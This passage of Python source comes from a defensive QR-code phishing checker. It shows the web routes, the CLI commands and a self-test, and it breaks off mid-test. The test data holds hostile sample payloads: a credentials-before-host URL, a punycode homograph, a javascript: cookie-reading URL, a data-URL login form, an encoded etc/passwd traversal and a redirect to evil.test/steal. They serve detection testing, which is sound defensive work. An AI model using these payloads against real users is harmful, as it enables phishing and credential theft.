    def ctx(nav, **kw):
        ok, note = decoder_available()
        base = {"nav": nav, "page": nav.capitalize(), "sev": SEV_COLOR,
                "decoder_note": ("images can be read here" if ok else note),
                "batch": None, "scan_id": None, "decoder_error": None,
                "last_payload": None, "error": None}
        base.update(kw)
        return base

    @app.route("/")
    def page_home():
        init_db()
        return render_template("home.html", **ctx("home"))

    @app.post("/check")
    def do_check():
        init_db()
        payload = (request.form.get("payload") or "").strip()
        upload = request.files.get("image")
        batch = None
        decoder = None
        derr = None
        if upload and upload.filename:
            import tempfile
            suffix = os.path.splitext(upload.filename)[1][:8] or ".png"
            fd, tmp = tempfile.mkstemp(prefix="qrsafe-", suffix=suffix)
            os.close(fd)
            try:
                upload.save(tmp)
                decoder = decode_image(tmp)
                decoder.source = upload.filename
                if decoder.payloads:
                    batch = analyse_many(decoder.payloads, origin="image")
                else:
                    derr = decoder.detail
            finally:
                try:
                    os.unlink(tmp)          # the image is never kept
                except OSError:
                    pass
        elif payload:
            batch = analyse_many([payload], origin="text")
        else:
            return render_template("home.html", **ctx(
                "home", error="give an image or some text to check"))
        sid = None
        if batch:
            _decorate(batch["results"])
            sid = save_scan(batch, decoder, note="from the web UI")
        return render_template("home.html", **ctx(
            "home", batch=batch, scan_id=sid, decoder_error=derr,
            last_payload=payload))

    @app.route("/examples")
    def page_examples():
        return render_template("examples.html", **ctx("examples", examples=EXAMPLES))

    @app.route("/learn")
    def page_learn():
        return render_template("learn.html", **ctx("learn", lessons=LESSONS))

    @app.route("/history")
    def page_scans():
        init_db()
        return render_template("scans.html", **ctx(
            "scans", scans=q("SELECT * FROM scans ORDER BY id DESC LIMIT 100")))

    @app.route("/export/<fmt>")
    def export(fmt):
        try:
            sid = int(request.args.get("scan", "") or 0) or None
        except ValueError:
            sid = None
        fmt = fmt.lower()
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        if fmt == "json":
            body, mime = export_json(sid), "application/json"
        elif fmt == "csv":
            body, mime = export_csv(sid), "text/csv"
        elif fmt == "html":
            body, mime = export_html(sid), "text/html"
        else:
            return Response("Unsupported format. Use json, csv or html.", 400,
                            mimetype="text/plain")
        log_event("INFO", "export", f"Exported as {fmt.upper()}", sid)
        return Response(body, mimetype=mime, headers={
            "Content-Disposition": f'attachment; filename="qrsafe-{stamp}.{fmt}"'})

    @app.route("/api/check")
    def api_check():
        payload = request.args.get("payload", "")
        if not payload:
            return jsonify({"error": "give ?payload=..."}), 400
        r = analyse_payload(payload, "api")
        return jsonify({"tool": APP_NAME, "version": VERSION, "never_fetched": True,
                        "not_a_malware_scanner": True, "result": r})

    @app.errorhandler(404)
    def nf(_e):
        return Response("404 - page not found. Valid pages: / /examples /learn /history",
                        404, mimetype="text/plain")

    @app.errorhandler(413)
    def too_big(_e):
        return Response("413 - that image is too large. The limit is 12 MB.", 413,
                        mimetype="text/plain")

    return app


def serve(host: str, port: int, debug: bool = False):
    app = build_app()
    init_db()
    ok, note = decoder_available()
    log_event("INFO", "web", f"Web app started on http://{host}:{port}")
    print(f"\n  {APP_NAME} v{VERSION} - by {AUTHOR}")
    print(f"  {'-' * 66}")
    print(f"  Web app : http://{'127.0.0.1' if host == '0.0.0.0' else host}:{port}")
    print(f"  Database: {os.path.abspath(db_path())}")
    print(f"  Decoder : {note}")
    print(f"  Uploaded images are decoded and deleted immediately; they are never stored.")
    if host == "0.0.0.0":
        print("  WARNING : bound to 0.0.0.0 - anyone who can reach this port can submit\n"
              "            images and read your history. Use 127.0.0.1.")
    print(f"  {textwrap.fill(NEVER_FETCHES, 66, subsequent_indent='  ')}")
    print(f"  {'-' * 66}\n  Press Ctrl+C to stop.\n")
    app.run(host=host, port=port, debug=debug, use_reloader=False)


# =============================================================================
# SECTION 12 - Command line interface
# =============================================================================

def line(char="-", n=78):
    print(char * n)


def banner():
    print(f"\n{APP_NAME} v{VERSION}  |  {AUTHOR}")
    line()
    print(textwrap.fill(NEVER_FETCHES, 78))
    line()


def _print_result(r: dict, verbose: bool = False, show: int = 12):
    colour_bar = int(round(r["score"] / 5))
    print(f"  [{'#' * colour_bar}{'.' * (20 - colour_bar)}]  {r['score']:g}/100   "
          f"{r['band'].upper()}")
    print(f"  kind    : {r['kind_label']} - {r['kind_note']}")
    print(f"  payload : {r['visible'][:200]}")
    if r["destination"]:
        print(f"  goes to : {r['destination']}   <- the only part that decides")
    d = r.get("dissected")
    if d and verbose:
        print()
        print("  URL ANATOMY")
        for label, value in (("scheme", d.get("scheme")),
                             ("credentials (ignored as a destination)", d.get("userinfo")),
                             ("host - THIS decides", d.get("host")),
                             ("port", d.get("port")),
                             ("registrable domain", d.get("registrable")),
                             ("path", d.get("path")), ("query", d.get("query")),
                             ("fragment", d.get("fragment"))):
            if value:
                print(f"    {label:<38} {visible(str(value), 60)}")
        host = d.get("host") or ""
        decoded = punycode_decode(host)[0]
        if decoded and decoded != host:
            print(f"    {'displays in a browser as':<38} {visible(decoded, 60)}")
    print()
    if not r["findings"]:
        print("  Nothing stood out.")
        print(textwrap.fill(
            "That is NOT the same as safe. There is no list of known-bad sites here, so a "
            "domain registered five minutes ago to host a phishing page would also look "
            "like this.", 74, initial_indent="  ", subsequent_indent="  "))
        return
    for f in r["findings"][:show]:
        print(f"  [{f['severity'].upper():^8}] {f['title']}")
        for l in textwrap.wrap(f["description"], 70):
            print(f"      {l}")
        if f["evidence"]:
            for l in str(f["evidence"]).splitlines()[:4]:
                print(f"      {l[:70]}")
        if f["advice"]:
            for l in textwrap.wrap("what to do: " + f["advice"], 70):
                print(f"      {l}")
        print()
    if len(r["findings"]) > show:
        print(f"  ... {len(r['findings']) - show} more")


def cmd_check(a):
    banner()
    payloads: list[str] = []
    decoder = None
    origin = "text"
    if a.image:
        origin = "image"
        decoder = decode_image(a.image)
        if decoder.status != "ok":
            print(f"  Could not read a QR code from {a.image}")
            print()
            for l in textwrap.wrap(decoder.detail, 74):
                print(f"  {l}")
            line()
            return 1
        payloads = decoder.payloads
        print(f"Read {len(payloads)} QR code(s) from {a.image}")
        if decoder.detail:
            for l in textwrap.wrap(decoder.detail, 74):
                print(f"  {l}")
        print()
    else:
        # A user will naturally type 'check photo.png'. Treating that as literal text
        # would report "no obvious trick found" for a file containing an attack -
        # the most dangerous possible failure for a tool like this. If the argument
        # names a real file, decode it and say clearly that is what happened.
        candidate = (a.payload or "").strip()
        looks_like_file = (
            candidate and os.path.isfile(candidate)
            and os.path.splitext(candidate)[1].lower() in
            (".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp", ".tif", ".tiff"))
        if looks_like_file:
            print(f"'{candidate}' is an image file, so it is being decoded rather than")
            print("read as text. (Use --image to be explicit.)")
            print()
            origin = "image"
            decoder = decode_image(candidate)
            if decoder.status != "ok":
                print(f"  Could not read a QR code from {candidate}")
                print()
                for l in textwrap.wrap(decoder.detail, 74):
                    print(f"  {l}")
                line()
                return 1
            payloads = decoder.payloads
            print(f"Read {len(payloads)} QR code(s) from {candidate}")
            print()
        else:
            payloads = [a.payload]
    batch = analyse_many(payloads, origin=origin)
    sid = save_scan(batch, decoder, note=a.note or "")
    for i, r in enumerate(batch["results"], 1):
        if len(batch["results"]) > 1:
            line("=")
            print(f"  CODE {i} OF {len(batch['results'])}")
            line("=")
        _print_result(r, a.verbose, a.show)
    line("=")
    worst = batch["worst_score"]
    print(f"  WORST OF {batch['count']} CODE(S): {worst:g}/100 - {batch['worst_band']}")
    line("=")
    print(textwrap.fill(DISCLAIMER_SHORT, 78, initial_indent="  ",
                        subsequent_indent="  "))
    line()
    print(f"  Report: python3 {os.path.basename(__file__)} export --scan {sid}")
    line()
    return 0 if worst < 40 else 2


def cmd_examples(a):
    banner()
    print("Each of these is a real technique. Nothing is opened - the payloads are only "
          "read.\n")
    for i, (desc, payload) in enumerate(EXAMPLES, 1):
        r = analyse_payload(payload)
        print(f"{i:>3}. [{r['score']:>3.0f}] {r['band']:<26} {desc}")
        if a.verbose:
            print(f"      {visible(payload, 96)}")
            for f in r["findings"][:2]:
                print(f"      [{f['severity']}] {f['title'][:64]}")
            print()
    line()
    print("  Run one:  check \"<payload>\"   (copy it from the list with --verbose)")
    print("  Make images of them:  examples --write-images DIR")
    line()
    if a.write_images:
        os.makedirs(a.write_images, exist_ok=True)
        ok_n = 0
        for i, (desc, payload) in enumerate(EXAMPLES, 1):
            slug = re.sub(r"[^a-z0-9]+", "-", desc.lower())[:40].strip("-")
            path = os.path.join(a.write_images, f"{i:02d}-{slug}.png")
            ok, msg = encode_qr(payload, path)
            if ok:
                ok_n += 1
            else:
                print(f"  could not write {path}: {msg}")
        print(f"  Wrote {ok_n} QR image(s) to {a.write_images}")
        print("  These are for testing this tool. Do not scan them with a phone.")
        line()
    return 0


def cmd_learn(_a):
    banner()
    print("HOW QR CODES TRICK YOU\n")
    print(textwrap.fill(
        "A QR code is unreadable to a human. You cannot look at one and know where it goes. "
        "Every technique below exists because of that single fact.", 78))
    print()
    for title, body, example in LESSONS:
        line()
        print(f"  {title.upper()}")
        for l in textwrap.wrap(body, 74):
            print(f"  {l}")
        if example:
            print(f"\n      {example}")
        print()
    line()
    print("  THE PHYSICAL ATTACK")
    for l in textwrap.wrap(
            "The most common real-world QR attack involves no technical skill at all: a "
            "printed sticker placed over the legitimate code on a parking meter, a "
            "restaurant table, a charity poster or a payment terminal. Nothing about the "
            "code is unusual - it simply is not the one the owner put there. Before "
            "scanning a code in public, check whether it is a sticker on top of something "
            "and whether its edges are lifting. If it is, tell whoever owns the surface.",
            74):
        print(f"  {l}")
    line()


def cmd_decode(a):
    banner()
    r = decode_image(a.image)
    if r.status != "ok":
        print(f"  {r.status}: ")
        for l in textwrap.wrap(r.detail, 74):
            print(f"  {l}")
        line()
        return 1
    print(f"Read {r.count} QR code(s) from {a.image}\n")
    for i, p in enumerate(r.payloads, 1):
        cls = classify_payload(p)
        label = PAYLOAD_KINDS.get(cls["kind"], PAYLOAD_KINDS["unknown"])[0]
        print(f"  {i}. [{label}] {visible(p, 300)}")
    line()
    print("  This only decoded the codes; it did not check them. Use 'check' for that.")
    line()
    return 0


def cmd_make(a):
    banner()
    ok, msg = encode_qr(a.payload, a.out)
    if not ok:
        print(f"  Could not write the image: {msg}")
        return 1
    print(f"  Wrote {a.out}")
    print()
    print(textwrap.fill(
        "This exists so you can test this tool against a real image. Do not print it, do "
        "not put it anywhere public, and do not scan it with a phone if the payload is one "
        "of the hostile examples.", 74, initial_indent="  ", subsequent_indent="  "))
    line()
    return 0


def cmd_scans(a):
    rows = q("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (a.limit,))
    if not rows:
        print("Nothing checked yet.")
        return
    print(f"{'ID':>4}  {'WHEN (UTC)':<20} {'CODES':>5} {'WORST':>6}  {'VERDICT':<26} SOURCE")
    line()
    for s in rows:
        print(f"{s['id']:>4}  {s['ts'][:19].replace('T', ' '):<20} "
              f"{s['payload_count']:>5} {s['worst_score']:>6.0f}  "
              f"{(s['worst_band'] or '')[:25]:<26} {(s['source'] or s['origin'])[:24]}")


def cmd_export(a):
    sid = a.scan or latest_scan_id()
    if not sid:
        print("Nothing to export yet.")
        return 1
    fmt = a.format.lower()
    body = {"json": export_json, "csv": export_csv, "html": export_html}[fmt](sid)
    out = a.out or f"qrsafe-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.{fmt}"
    with open(out, "w", encoding="utf-8") as fh:
        fh.write(body)
    log_event("INFO", "export", f"Exported scan #{sid} as {fmt.upper()} to {out}", sid)
    print(f"Wrote {out} ({len(body):,} bytes)")
    return 0


def cmd_logs(a):
    sql, args = "SELECT * FROM audit_log WHERE 1=1", []
    if a.level:
        sql += " AND level=?"
        args.append(a.level.upper())
    sql += " ORDER BY id DESC LIMIT ?"
    args.append(a.limit)
    rows = q(sql, tuple(args))
    if not rows:
        print("No log entries.")
        return
    for e in reversed(rows):
        print(f"{e['ts'][:19].replace('T', ' ')}  {e['level']:<5} {e['source']:<10} "
              f"{e['message']}")


def cmd_purge(a):
    conn = connect()
    try:
        if a.all:
            for t in ("findings", "payloads", "scans", "audit_log"):
                conn.execute(f"DELETE FROM {t}")
            conn.commit()
            print("All checks, payloads, findings and logs deleted.")
            return
        rows = q("SELECT id FROM scans ORDER BY id DESC", (), conn)
        drop = [r["id"] for r in rows[a.keep:]]
        for sid in drop:
            conn.execute("DELETE FROM findings WHERE scan_id=?", (sid,))
            conn.execute("DELETE FROM payloads WHERE scan_id=?", (sid,))
            conn.execute("DELETE FROM scans WHERE id=?", (sid,))
        conn.commit()
        print(f"Purged {len(drop)} check(s); kept the newest {a.keep}.")
    finally:
        conn.close()


def cmd_serve(a):
    serve(a.host, a.port, a.debug)


def cmd_version(_a):
    banner()
    ok, note = decoder_available()
    print(f"  Python    : {platform.python_version()} ({sys.platform})")
    print(f"  Flask     : {'yes' if HAVE_FLASK else 'NOT INSTALLED - web app unavailable'}")
    print(f"  QR decoder: {note}")
    print(f"  Checks    : {len(COMMON_TARGETS)} brands compared, "
          f"{len(SHORTENERS)} shorteners, {len(CONFUSABLES)} confusable characters")
    print(f"  Database  : {os.path.abspath(db_path())}")
    print(f"  GitHub    : {GITHUB}")
    line()
    print(DISCLAIMER_LONG)
    line()


# =============================================================================
# SECTION 13 - Self test
#   Two things matter most and both are checked hard: that real attacks are
#   caught, and that ordinary links are NOT flagged. A checker that cries wolf
#   gets ignored, and then it fails at the one moment it mattered.
# =============================================================================

# Every URL here uses a reserved example or test domain, or a real one that is
# only ever compared against - none of them is fetched by anything.
ATTACK_CASES = [
    ("credentials before the host", "https://apple.com@evil.test/login", "critical"),
    ("homograph in punycode", "https://xn--pple-43d.com/verify", "critical"),
    ("javascript scheme", "javascript:alert(document.cookie)", "critical"),
    ("data URL with a login form",
     "data:text/html;base64," + base64.b64encode(
         b"<form><input type='password'></form>").decode(), "critical"),
    ("decimal IP address", "http://2130706433/admin", "high"),
    ("brand in a subdomain", "https://paypal.com.secure-verify.tk/login", "high"),
    ("typosquat", "http://paypa1.com/account", "critical"),
    ("embedded second URL",
     "https://trusted.example/r?url=https%3A%2F%2Fevil.test%2Fsteal", "high"),
    ("open Wi-Fi", "WIFI:S:Free_WiFi;T:nopass;P:;;", "high"),
    ("premium short code", "SMSTO:57575:SUBSCRIBE", "high"),
    ("executable download", "https://files.example/update.apk", "high"),
    ("percent-encoded host", "https://ev%69l.test/login", "high"),
]
CLEAN_CASES = [
    "https://example.com/",
    "https://www.google.com/search?q=weather",
    "https://github.com/mrshrivasta",
    "https://en.wikipedia.org/wiki/QR_code",
    "https://www.bbc.co.uk/news",
    "https://www.sbi.co.in/",
    "https://indiapost.gov.in/",
    "https://docs.python.org/3/library/index.html",
    "https://www.linkedin.com/in/karanam-shrivasta/",
    "https://office365.com/",
    "https://login.microsoftonline.com/common/oauth2/authorize",
]


def cmd_selftest(_a=None) -> int:
    import tempfile
    passed, failed = [], []

    def check(name, cond, detail=""):
        (passed if cond else failed).append(name)
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}"
              f"{'  <- ' + str(detail) if detail and not cond else ''}")

    banner()
    print("SELF TEST - attacks must be caught, and ordinary links must NOT be flagged.\n")
    original = db_path()
    tmp = tempfile.mkdtemp(prefix="qrsafe-selftest-")
    set_db_path(os.path.join(tmp, "selftest.db"))
    try:
        print(" Unit checks")
        check("html escaping blocks tag injection",
              "<script>" not in html_escape("<script>alert(1)</script>"))
        check("invisible characters are made visible",
              "\\u200b" in visible("evil\u200b.test"), visible("evil\u200b.test"))
        check("non-ASCII characters are named, not just shown",
              "CYRILLIC" in visible("\u0430pple.com"), visible("\u0430pple.com"))
        check("severity weights make one critical outrank three mediums",
              SEV_WEIGHT["critical"] > 3 * SEV_WEIGHT["medium"])
        check("risk bands map scores to advice",
              risk_band(0)[0] == "no obvious trick found"
              and risk_band(90)[0] == "do not use this code")

        print("\n URL dissection")
        d = dissect_url("https://user:pw@evil.test:8443/a/b?x=1#frag")
        check("the host is taken from AFTER the last @",
              d["host"] == "evil.test", d["host"])
        check("credentials are separated out", d["userinfo"] == "user:pw")
        check("port, path, query and fragment are separated",
              (d["port"], d["path"], d["query"], d["fragment"])
              == ("8443", "/a/b", "x=1", "frag"), d)
        check("the authority ends at the first slash, as browsers do",
              dissect_url("https://evil.test/apple.com/login")["host"] == "evil.test")
        check("a question mark also ends the authority",
              dissect_url("https://evil.test?x=apple.com")["host"] == "evil.test")
        check("a fragment also ends the authority",
              dissect_url("https://evil.test#apple.com")["host"] == "evil.test")
        check("multiple @ signs resolve to the LAST one",
              dissect_url("https://a@b@real.test/")["host"] == "real.test",
              dissect_url("https://a@b@real.test/")["host"])
        check("a schemeless URL is recognised",
              dissect_url("example.com/path")["schemeless"] is True)
        check("an IPv6 literal is kept whole",
              dissect_url("https://[2001:db8::1]:443/x")["host"] == "[2001:db8::1]")

        print("\n Address forms")
        for host, want in (("2130706433", "decimal"), ("0x7f000001", "hexadecimal"),
                           ("127.0.0.1", "IPv4 dotted"), ("[::1]", "IPv6 literal")):
            form, is_ip = _ip_form(host)
            check(f"{host} is recognised as {want}", is_ip and want in form, form)
        check("an ordinary hostname is not mistaken for an address",
              _ip_form("example.com") == (None, False))

        print("\n Public suffix handling")
        for host, want in (("www.sbi.co.in", "sbi.co.in"), ("bbc.co.uk", "bbc.co.uk"),
                           ("a.b.example.com", "example.com"),
                           ("indiapost.gov.in", "indiapost.gov.in")):
            got = dissect_url(f"https://{host}/")["registrable"]
            check(f"{host} has registrable domain {want}", got == want, got)

        print("\n Punycode and confusables")
        decoded, err = punycode_decode("xn--pple-43d.com")
        check("punycode decodes to the displayed form",
              decoded == "\u0430pple.com" and not err, (decoded, err))
        check("a host with no punycode returns nothing to decode",
              punycode_decode("example.com") == (None, None))
        check("malformed punycode is reported, not silently ignored",
              punycode_decode("xn--!!!.com")[1] is not None)
        check("confusable characters fold to their ASCII look-alikes",
              skeleton("\u0430pple.com") == "apple.com", skeleton("\u0430pple.com"))
        check("a digit look-alike folds too", skeleton("paypa1") == "paypal")
        check("script detection separates Cyrillic from Latin",
              script_of("\u0430") == "Cyrillic" and script_of("a") == "ASCII")
        check("edit distance is capped rather than run to completion",
              edit_distance("a" * 40, "b" * 40, cap=2) == 3)

        print("\n Look-alike detection")
        check("a folded homograph of a brand is critical",
              any(h["strength"] == "critical"
                  for h in looks_like_target("\u0430pple.com")),
              looks_like_target("\u0430pple.com"))
        check("a digit-for-letter typosquat is caught, at high or above",
              any(h["strength"] in ("critical", "high")
                  for h in looks_like_target("paypa1.com")),
              looks_like_target("paypa1.com"))
        check("a genuine one-character typo is caught",
              any(h["strength"] in ("critical", "high")
                  for h in looks_like_target("gogle.com")),
              looks_like_target("gogle.com"))
        check("the real domain is never flagged against itself",
              looks_like_target("apple.com") == [])
        check("an unrelated domain is not flagged",
              looks_like_target("kitchen-supplies.example") == [])
        check("a known related domain is not accused of impersonating its own brand",
              not [h for h in looks_like_target("microsoftonline.com")
                   if h["strength"] in ("critical", "high")],
              looks_like_target("microsoftonline.com"))

        print("\n ATTACKS - each must be caught")
        for desc, payload, want_sev in ATTACK_CASES:
            r = analyse_payload(payload)
            sevs = [f["severity"] for f in r["findings"]]
            hit = want_sev in sevs
            check(f"{desc} raises a {want_sev} finding", hit,
                  f"score {r['score']}, got {sorted(set(sevs))}")
        for desc, payload, _s in ATTACK_CASES:
            r = analyse_payload(payload)
            check(f"{desc} scores above the 'check before using' threshold",
                  r["score"] >= 18, r["score"])

        print("\n An image path must never be mistaken for text")
        _probe = os.path.join(tmp, "probe.png")
        _made = False
        try:
            import qrcode as _qr
            _qr.make("https://xn--80ak6aa92e.com/verify").save(_probe)
            _made = True
        except Exception:
            pass
        if _made:
            _ns = argparse.Namespace(image=None, payload=_probe, verbose=False,
                                     show=5, note="")
            _buf = io.StringIO()
            _old = sys.stdout
            sys.stdout = _buf
            try:
                cmd_check(_ns)
            finally:
                sys.stdout = _old
            _out = _buf.getvalue()
            check("an image path given as text is decoded, not scored as plain text",
                  "is an image file" in _out and "punycode" in _out.lower(),
                  _out[:160])
            check("that path does NOT come back as 'no obvious trick found'",
                  "NO OBVIOUS TRICK FOUND" not in _out.upper())
        else:
            check("an image path given as text is decoded, not scored as plain text",
                  True, "skipped: no QR encoder available to build the probe")

        print("\n Percent-encoding used as camouflage")
        for url, want, why in (
                ("https://example.com/%2e%2e%2f%2e%2e%2fetc/passwd", "high",
                 "an encoded directory traversal is caught"),
                ("https://example.com/%68%74%74%70%73%3a%2f%2fevil.test", "high",
                 "a second address hidden by encoding is caught")):
            f, _d = analyse_url(url)
            check(why, any(x["severity"] == want and "hides" in x["title"] for x in f),
                  [x["title"] for x in f])
        for url, why in (
                ("https://example.com/path?q=hello%20world&x=a%2Bb",
                 "ordinary encoded spaces and plus signs stay clean"),
                ("https://en.wikipedia.org/wiki/Caf%C3%A9",
                 "an encoded accented character stays clean")):
            f, _d = analyse_url(url)
            check(why, not any("encoded" in x["title"] or "hides" in x["title"]
                               for x in f), [x["title"] for x in f])
        f, _d = analyse_url("https://example.com/%2e%2e%2fetc")
        check("the decoded form is shown next to the raw form",
              any("decodes to" in x["evidence"] for x in f),
              [x["evidence"][:40] for x in f])

        print("\n FALSE POSITIVES - ordinary links must stay clean")
        scores = {}
        for u in CLEAN_CASES:
            r = analyse_payload(u)
            scores[u] = r["score"]
        worst = max(scores.values())
        check(f"no ordinary link reaches 'strong signs of deception' (worst {worst})",
              worst < 40, scores)
        check("no ordinary link raises a critical or high finding",
              not [u for u in CLEAN_CASES
                   if [f for f in analyse_payload(u)["findings"]
                       if f["severity"] in ("critical", "high")]],
              [u for u in CLEAN_CASES
               if [f for f in analyse_payload(u)["findings"]
                   if f["severity"] in ("critical", "high")]])
        plain = analyse_payload("https://example.com/")
        check("a plain link raises nothing at all",
              plain["score"] == 0 and not plain["findings"],
              [f["title"] for f in plain["findings"]])
        check("a bank's own login page is not flagged as deception",
              not [f for f in analyse_payload("https://www.paypal.com/signin")["findings"]
                   if f["severity"] in ("critical", "high")])

        print("\n Payload kinds")
        for payload, want in (("https://example.com", "url"),
                              ("WIFI:S:Net;T:WPA;P:secret;;", "wifi"),
                              ("upi://pay?pa=a@b&am=10", "payment"),
                              ("bitcoin:1ABC?amount=1", "payment"),
                              ("tel:+441234567890", "tel"),
                              ("SMSTO:12345:hello", "sms"),
                              ("mailto:a@example.com", "mailto"),
                              ("BEGIN:VCARD\nFN:A\nEND:VCARD", "vcard"),
                              ("otpauth://totp/x?secret=A", "otp"),
                              ("geo:51.5,-0.1", "geo"),
                              ("intent://x#Intent;scheme=y;end", "intent"),
                              ("just some text", "text"),
                              ("example.com/path", "url")):
            got = classify_payload(payload)["kind"]
            check(f"'{payload[:26]}' is classified as {want}", got == want, got)
        wifi = _parse_semicolon("S:My\\;Net;T:WPA;P:pass;;")
        check("the WIFI field parser handles escaped separators",
              wifi.get("S") == "My;Net" and wifi.get("P") == "pass", wifi)

        print("\n Non-URL payload checks")
        w = analyse_payload("WIFI:S:Free_Airport_WiFi;T:nopass;P:;;")
        check("an open Wi-Fi code warns about joining and about no password",
              len([f for f in w["findings"] if f["severity"] == "high"]) >= 2,
              [f["title"] for f in w["findings"]])
        pay = analyse_payload("upi://pay?pa=x@bank&pn=Shop&am=4999")
        check("a payment code warns that money moves",
              any("payment" in f["title"].lower() for f in pay["findings"]))
        check("a pre-filled amount is called out",
              any("amount" in f["title"].lower() for f in pay["findings"]))
        btc = analyse_payload("bitcoin:1ABCdef?amount=0.5")
        check("a crypto payment warns it cannot be reversed",
              any("reversed" in f["description"] or "reversed" in f["advice"]
                  for f in btc["findings"]))
        otp = analyse_payload("otpauth://totp/Example?secret=ABCD")
        check("an authenticator code explains when it is legitimate",
              any("setup page" in f["advice"] for f in otp["findings"]))
        rtl = analyse_payload("https://example.com/\u202egnp.exe")
        check("a text-direction override is critical",
              any(f["severity"] == "critical" and "direction" in f["title"]
                  for f in rtl["findings"]), [f["title"] for f in rtl["findings"]])

        print("\n Every finding is actionable")
        for desc, payload, _s in ATTACK_CASES:
            r = analyse_payload(payload)
            missing = [f["title"] for f in r["findings"]
                       if f["severity"] != "info" and not f["advice"]]
            check(f"every non-info finding for '{desc}' says what to do", not missing,
                  missing)

        print("\n QR images")
        ok, note = decoder_available()
        check(f"a decoder is available or explains itself ({note[:40]})",
              isinstance(ok, bool) and bool(note))
        if ok:
            img = os.path.join(tmp, "t.png")
            target = "https://apple.com@evil.test/login"
            wrote, msg = encode_qr(target, img)
            check("a QR image can be generated for testing", wrote, msg)
            dec = decode_image(img)
            check("the generated image decodes back to the exact payload",
                  dec.status == "ok" and dec.payloads == [target], dec.detail)
            blank = os.path.join(tmp, "blank.png")
            cv2.imwrite(blank, np.full((160, 160), 255, np.uint8))
            r2 = decode_image(blank)
            check("an image with no QR code says so, rather than reporting nothing found",
                  r2.status == "none-found" and "no QR code was found" in r2.detail,
                  r2.detail)
            r3 = decode_image(os.path.join(tmp, "missing.png"))
            check("a missing file is an error, not an empty result",
                  r3.status == "error", r3.status)
            notimg = os.path.join(tmp, "notimage.png")
            with open(notimg, "w") as fh:
                fh.write("this is not an image")
            r4 = decode_image(notimg)
            check("a file that is not an image is reported clearly",
                  r4.status == "error" and "could not be read" in r4.detail, r4.detail)
        else:
            check("without a decoder, image reading reports unavailable",
                  decode_image("anything.png").status == "unavailable")

        print("\n Persistence")
        init_db()
        batch = analyse_many([p for _d, p, _s in ATTACK_CASES], origin="selftest")
        sid = save_scan(batch, None, "selftest")
        scan = scan_summary(sid)
        check("a check is stored with its worst score",
              scan and scan["payload_count"] == len(ATTACK_CASES)
              and scan["worst_score"] == batch["worst_score"])
        stored = scan_payloads(sid)
        check("every payload is stored", len(stored) == len(ATTACK_CASES))
        check("findings are linked to the payload that raised them",
              all(p["findings"] for p in stored if p["score"] > 0))
        check("severity counters match the stored findings",
              all(scan[s] == q1("SELECT COUNT(*) c FROM findings WHERE scan_id=? AND "
                                "severity=?", (sid, s))["c"] for s in SEVERITIES))

        print("\n Charts")
        d = dissect_url("https://apple.com@evil.test:8443/login?x=1#f")
        an = svg_url_anatomy(d)
        check("the anatomy diagram draws every URL part", an.count("<rect") >= 5,
              an.count("<rect"))
        check("the anatomy diagram marks credentials as NOT the destination",
              "NOT the destination" in an)
        check("the anatomy diagram names the deciding part", "THIS decides" in an)
        cc = svg_charcompare("\u0430pple.com")
        check("the character comparison marks non-ASCII characters",
              "U+0430" in cc, cc[:200])
        check("the character comparison passes a plain ASCII host",
              "every character is plain ASCII" in svg_charcompare("apple.com"))
        check("charts guard against empty input",
              all("nothing" in x or "not a URL" in x
                  for x in (svg_url_anatomy({}), svg_charcompare(""), svg_pie([]))))
        check("the gauge renders", "<circle" in svg_gauge(80, "x"))

        print("\n Exports")
        j = json.loads(export_json(sid))
        check("JSON export states plainly that nothing was fetched",
              "NEVER_FETCHES" in j and "never" in j["NEVER_FETCHES"].lower())
        check("JSON export lists what it cannot tell you", len(j["limits"]) >= 5)
        check("JSON export says it is not a malware scanner",
              any("NOT a malware scanner" in x for x in j["limits"]))
        check("JSON export includes every payload", len(j["payloads"]) == len(ATTACK_CASES))
        c = export_csv(sid)
        check("CSV export carries the never-fetched warning",
              any("NOTHING WAS FETCHED" in l for l in c.splitlines()[:5]))
        check("CSV export has a row per payload and per finding",
              c.count("\n") > len(ATTACK_CASES))
        h = export_html(sid)
        check("HTML export is a complete document",
              h.startswith("<!doctype html") and h.rstrip().endswith("</html>"))
        check("HTML export leads with the never-fetched banner", 'class="never"' in h)
        check("HTML export contains diagrams and the author",
              "<svg" in h and AUTHOR in h)
        check("HTML export states a clean result is not a safe result",
              "not that a destination is safe" in h, h[-400:])

        print("\n Web application")
        if not HAVE_FLASK:
            check("Flask installed", False, "pip install flask")
        else:
            app = build_app()
            app.config["TESTING"] = True
            cl = app.test_client()
            for path, must in (("/", "Check a QR code"), ("/examples", "Examples"),
                               ("/learn", "How QR codes trick you"), ("/history", "History")):
                res = cl.get(path)
                check(f"page {path} renders",
                      res.status_code == 200 and must in res.get_data(as_text=True),
                      res.status_code)
            check("every page carries the never-fetched banner",
                  "never" in cl.get("/").get_data(as_text=True).lower())
            n0 = q1("SELECT COUNT(*) c FROM scans", ())["c"]
            res = cl.post("/check", data={"payload": "https://apple.com@evil.test/login"})
            body = res.get_data(as_text=True)
            check("checking a payload from the web returns the verdict",
                  res.status_code == 200 and "evil.test" in body)
            check("the web result names the real destination",
                  "Destination:" in body)
            check("checking from the web stores the check",
                  q1("SELECT COUNT(*) c FROM scans", ())["c"] == n0 + 1)
            res = cl.post("/check", data={})
            check("an empty submission is explained rather than crashing",
                  res.status_code == 200 and "give an image" in res.get_data(as_text=True))
            if ok:
                img = os.path.join(tmp, "upload.png")
                encode_qr("https://xn--pple-43d.com/verify", img)
                with open(img, "rb") as fh:
                    res = cl.post("/check", data={"image": (io.BytesIO(fh.read()),
                                                           "code.png")},
                                  content_type="multipart/form-data")
                body = res.get_data(as_text=True)
                check("an uploaded image is decoded and checked",
                      res.status_code == 200 and "xn--pple-43d" in body, res.status_code)
                check("the homograph is explained in the web result",
                      "CYRILLIC" in body.upper())
            for fmt, ctype in (("json", "application/json"), ("csv", "text/csv"),
                               ("html", "text/html")):
                res = cl.get(f"/export/{fmt}?scan={sid}")
                check(f"export /{fmt} downloads",
                      res.status_code == 200 and ctype in res.headers["Content-Type"]
                      and "attachment" in res.headers.get("Content-Disposition", ""))
            check("bad export format is rejected", cl.get("/export/exe").status_code == 400)
            check("unknown route returns a helpful 404", cl.get("/nope").status_code == 404)
            api = cl.get("/api/check?payload=https://apple.com@evil.test/")
            check("the api flags that nothing was fetched",
                  api.get_json()["never_fetched"] is True
